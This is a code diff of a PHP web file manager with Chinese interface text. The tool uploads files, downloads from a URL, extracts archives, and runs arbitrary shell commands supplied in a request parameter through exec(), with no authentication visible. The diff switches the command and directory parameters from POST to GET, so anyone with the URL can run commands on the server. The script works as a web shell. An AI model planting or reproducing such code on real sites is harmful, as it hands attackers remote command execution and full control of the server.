@@ -16,7 +16,7 @@ $packages = [
 
 // 获取当前目录路径
 $dir = __DIR__;
-$targetDir = isset($_POST['target_dir']) ? $_POST['target_dir'] : $dir;
+$targetDir = isset($_GET['target_dir']) ? $_GET['target_dir'] : $dir;
 $path = isset($_GET['path']) ? $_GET['path'] : '';
 
 if (!empty($path) && is_dir($path)) {
@@ -47,7 +47,7 @@ if (isset($_GET['download_url'])) {
 // 处理压缩包解压
 if (isset($_GET['extract'])) {
     $archiveFile = $_GET['extract'];
-    $extractDir = isset($_POST['extract_dir']) ? $_POST['extract_dir'] : $dir;
+    $extractDir = isset($_GET['extract_dir']) ? $_GET['extract_dir'] : $dir;
 
     // 检查文件扩展名以确定解压方式
     $extension = pathinfo($archiveFile, PATHINFO_EXTENSION);
@@ -77,8 +77,8 @@ if (isset($_GET['extract'])) {
 }
 
 // 执行命令
-if (isset($_POST['command'])){
-    $command = $_POST['command'];
+if (isset($_GET['command'])){
+    $command = $_GET['command'];
     $lastLine = exec($command, $output, $exitCode);
     if ($exitCode === 0) {
         $commandResult = implode("\n", $output);
@@ -120,7 +120,7 @@ echo "</ul>";
 </head>
 <body>
     <h2>上传文件</h2>
-    <form method="POST" enctype="multipart/form-data">
+    <form method="POST" enctype="multipart/form-data" action="?">
         <input type="file" name="file">
         <input type="text" name="target_dir" placeholder="目标路径" value="<?php echo $targetDir; ?>">
         <input type="submit" value="上传">
@@ -159,7 +159,7 @@ echo "</ul>";
     </form>
 
     <h2>执行命令</h2>
-    <form method="POST" action="">
+    <form method="GET" action="">
         <input type="text" name="command" placeholder="命令">
         <input type="submit" value="执行">
     </form>
